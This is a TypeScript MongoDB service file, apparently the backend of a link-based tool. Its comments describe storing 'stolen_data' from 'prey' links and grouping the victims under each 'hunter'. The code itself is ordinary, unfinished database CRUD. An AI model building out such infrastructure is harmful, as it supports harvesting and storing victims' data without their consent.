import mongoDatabase from "../helper/mongodb.ts"
import { Bson } from "deps";
import {} from "../model/mongoSchema.ts"

class MongoService {

  async createUser(username: string, hashedPassword: string, hunter: string) {
    const usersCollection = mongoDatabase.collection("users")
    const result = await usersCollection.insertOne({
        username: username,
        hashedPassword: hashedPassword,
        hunter: hunter,
      });

      return result;
  }

    //TODO: We neeed a "CREATE" function to store the {praylink, stolen_data}
    
  async createLinks(hunter: string, prey: string, action: string) {
    const linksCollection = mongoDatabase.collection("links")
    const result = await linksCollection.insertOne({
        hunter: hunter,
        prey: prey,
        action: action,
      });
      return result;
  }

   // THIS SHOULD BE FINDING USERS EITHER BY EMAIL OR ID
  async findUser(type: string, username?: string, _id?: Bson.ObjectId) {
    const usersCollection = mongoDatabase.collection("users")
    let userData = undefined;
    if (type === "id") {
        try {
            userData = await usersCollection.findOne({ _id: _id });
            return userData;
          } catch (error) {
            error;
          }
    }else if (type === "email") {
        try {
            userData = await usersCollection.findOne({ username: { $in: [username] } });
            return userData;
          } catch (error) {
            error;
        } 
    }
  }

  async associateHunter (hunter: string, _id: Bson.ObjectId) {
    const usersCollection = mongoDatabase.collection("users")
    await usersCollection.updateOne(
      { _id:  _id },
      { $set: { hunter: hunter } },
    );
  }

    //TODO: We need to create update methods for changing password, to link a hunter ID into an account
  async update() {}
   
  async delete() {}
   /*TODO:
    Need to create a new collection called "preys". In there we'll store {praylink, stolen_data}. When we want to gather 
    the information we use the hunter link to find the prey link and then we aggregate the preys with:
        Aggregation
            const docs = await users.aggregate([
              { $match: { username: "many" } },
              { $group: { _id: "$username", total: { $sum: 1 } } },
            ]).toArray();
   */

}

const mongoService = new MongoService

export default mongoService;